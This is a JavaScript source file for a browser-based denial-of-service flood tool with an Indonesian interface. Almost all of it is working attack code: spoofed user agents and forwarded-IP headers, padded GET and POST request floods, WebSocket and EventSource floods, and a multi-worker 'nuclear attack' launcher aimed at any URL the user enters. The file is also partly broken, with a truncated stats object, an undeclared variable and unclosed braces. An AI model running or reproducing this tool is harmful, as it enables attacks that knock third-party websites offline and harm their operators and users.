let startTime = null;
let stats = {

    success: 0,

const USER_AGENTS = [

    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)'
];

// PAYLOAD DATABASE (Various attack vectors)
const PAYLOADS = {
    get: [
        '?id=' + Math.random(),
        '?t=' + Date.now(),
        '?session=' + Math.random().toString(36),
        '?cache=' + Math.random(),
        '?ajax=1&_=' + Date.now(),
        '?format=json&callback=jQuery' + Math.random(),
        '?action=load&nonce=' + Math.random().toString(36),
        '?q=' + encodeURIComponent(Math.random().toString(36)),
        '?page=' + Math.floor(Math.random() * 1000),
        '?redirect=' + Math.random()
    ],
    post: {
        form: 'username=' + Math.random() + '&password=' + Math.random() + '&submit=1',
        json: JSON.stringify({data: Array(100).fill('X').join(''), timestamp: Date.now()}),
        xml: '<data><id>' + Math.random() + '</id><value>' + Math.random() + '</value></data>'
    }
};

// LOG SYSTEM
function log(msg, type = 'info') {
    const logDiv = document.getElementById('log');
    const entry = document.createElement('div');
    entry.className = 'log-entry ' + type;
    entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
    logDiv.appendChild(entry);
    logDiv.scrollTop = logDiv.scrollHeight;
    
    if (logDiv.children.length > 200) {
        logDiv.removeChild(logDiv.firstChild);
    }
}

// UPDATE METRICS
function updateMetrics() {
    document.getElementById('totalReq').textContent = stats.total.toLocaleString();
    document.getElementById('success').textContent = stats.success.toLocaleString();
    document.getElementById('errors').textContent = stats.error.toLocaleString();
    
    const elapsed = (Date.now() - startTime) / 1000;
    const rps = elapsed > 0 ? (stats.total / elapsed).toFixed(1) : '0';
    document.getElementById('reqSec').textContent = rps;
    
    const bandwidthMB = (stats.bandwidth / 1024 / 1024).toFixed(2);
    document.getElementById('bandwidth').textContent = bandwidthMB + ' MB';
    document.getElementById('bandwidthBar').style.width = Math.min(stats.bandwidth / (1024 * 1024), 100) + '%';
}

// RANDOM IP GENERATOR
function getRandomIP() {
    return Math.floor(Math.random() * 255) + '.' +
           Math.floor(Math.random() * 255) + '.' +
           Math.floor(Math.random() * 255) + '.' +
           Math.floor(Math.random() * 255);
}

// GENERATE RANDOM HEADERS
function generateHeaders() {
    const headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        'TE': 'trailers'
    };
    
    // Random User Agent
    headers['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
    
    // Random X-Forwarded-For chain
    headers['X-Forwarded-For'] = Array(3).fill(0).map(() => getRandomIP()).join(', ');
    headers['X-Real-IP'] = getRandomIP();
    headers['CF-Connecting-IP'] = getRandomIP();
    
    // Add custom headers if provided
    try {
        const custom = JSON.parse(document.getElementById('customHeaders').value);
        Object.assign(headers, custom);
    } catch(e) {}
    
    return headers;
}

// GENERATE RANDOM PAYLOAD
function generatePayload(method) {
    const size = parseInt(document.getElementById('payloadSize').value) * 1024;
    
    if (method === 'POST') {
        const types = Object.keys(PAYLOADS.post);
        const type = types[Math.floor(Math.random() * types.length)];
        let payload = PAYLOADS.post[type];
        
        // Pad payload to desired size
        while (payload.length < size) {
            payload += '&' + Math.random().toString(36).repeat(10);
        }
        
        return payload.substring(0, size);
    }
    
    // For GET, return random query string
    const queries = PAYLOADS.get;
    return queries[Math.floor(Math.random() * queries.length)];
}

// WEB SOCKET FLOOD
function websocketFlood(url) {
    const wsUrl = url.replace('http', 'ws') + '/ws';
    let wsCount = 0;
    
    setInterval(() => {
        if (wsCount < 50) { // Limit WebSocket connections
            try {
                const ws = new WebSocket(wsUrl);
                ws.onopen = () => {
                    stats.success++;
                    ws.send('FLOOD'.repeat(100));
                    setInterval(() => ws.send('PING'), 100);
                };
                ws.onerror = () => stats.error++;
                wsCount++;
            } catch(e) {}
        }
    }, 100);
}

// EVENTSOURCE FLOOD
function eventsourceFlood(url) {
    setInterval(() => {
        try {
            const es = new EventSource(url);
            es.onopen = () => stats.success++;
            es.onerror = () => {
                stats.error++;
                es.close();
            };
            setTimeout(() => es.close(), 5000);
        } catch(e) {}
    }, 1000);
}

// MULTI-METHOD ATTACK WORKER
function createWorker(workerId, targetUrl, methods, delay) {
    return async function() {
        while (isAttacking) {
            const method = methods[Math.floor(Math.random() * methods.length)];
            
            if (method === 'WEBSOCKET') {
                websocketFlood(targetUrl);
                await new Promise(r => setTimeout(r, 100));
                continue;
            }
            
            if (method === 'EVENTSOURCE') {
                eventsourceFlood(targetUrl);
                await new Promise(r => setTimeout(r, 1000));
                continue;
            }
            
            const url = targetUrl + (method === 'GET' ? generatePayload('GET') : '');
            const headers = generateHeaders();
            
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 10000);
            
            try {
                const start = Date.now();
                const options = {
                    method: method,
                    headers: headers,
                    mode: 'no-cors',
                    signal: controller.signal,
                    credentials: 'omit'
                };
                
                if (method === 'POST') {
                    options.body = generatePayload('POST');
                    options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                    stats.bandwidth += options.body.length;
                }
                
                await fetch(url, options);
                const latency = Date.now() - start;
                
                stats.total++;
                stats.success++;
                stats.bandwidth += url.length;
                
                if (latency < 1000) {
                    log(`Worker ${workerId}: ${method} ${latency}ms`, 'success');
                } else {
                    log(`Worker ${workerId}: ${method} SLOW ${latency}ms`, 'warning');
                }
                
            } catch (error) {
                stats.total++;
                stats.error++;
                log(`Worker ${workerId}: ${method} FAILED`, 'error');
            } finally {
                clearTimeout(timeoutId);
            }
            
            if (delay > 0) {
                await new Promise(r => setTimeout(r, delay));
            }
        }
    };
}

// NUCLEAR ATTACK INITIATOR
async function startNuclearAttack() {
    const targetUrl = document.getElementById('targetUrl').value.trim();
    if (!targetUrl) {
        alert('Masukkan URL target!');
        return;
    }
    
    if (!confirm(`🚨 EXTREME WARNING 🚨\n\nAttack akan dimulai ke:\n${targetUrl}\n\nIP ANDA AKAN TERBUKA!\nHUKUM PIDANA MENANTI!\n\nLANJUTKAN?`)) {
        return;
    }
    
    // Reset stats
    stats = { total: 0, success: 0, error: 0, bandwidth: 0, workers: 0 };
    startTime = Date.now();
    isAttacking = true;
    
    const threadCount = parseInt(document.getElementById('threads').value);
    const delay = parseInt(document.getElementById('delay').value);
    const methodSelect = document.getElementById('method');
    const methods = Array.from(methodSelect.selectedOptions).map(o => o.value);
    
    log(`🚀 LAUNCHING NUCLEAR ATTACK ON ${targetUrl}`, 'warning');
    log(`⚙️ Configuration: ${threadCount} threads, ${methods.join(', ')} methods`, 'info');
    log(`🔥 Attack started at ${new Date().toLocaleString()}`, 'warning');
    
    // Launch workers
    for (let i = 0; i < threadCount; i++) {
        setTimeout(() => {
            if (isAttacking) {
                const worker = createWorker(i + 1, targetUrl, methods, delay);
                worker();
                stats.workers++;
            }
        }, Math.random() * 1000); // Stagger startup
    }
    
    // Update metrics every second
    const metricInterval = setInterval(() => {
        updateMetrics();
        if (!isAttacking) {
            clearInterval(metricInterval);
        }
    }, 1000);
    
    // Auto-log every 30 seconds
    setInterval(() => {
        if (isAttacking) {
            const elapsed = (Date.now() - startTime) / 1000;
            log(`📊 STATS: ${stats.total} req, ${(stats.total/elapsed).toFixed(1)} req/sec, ${(stats.bandwidth/1024/1024).toFixed(2)} MB`, 'info');

}

}
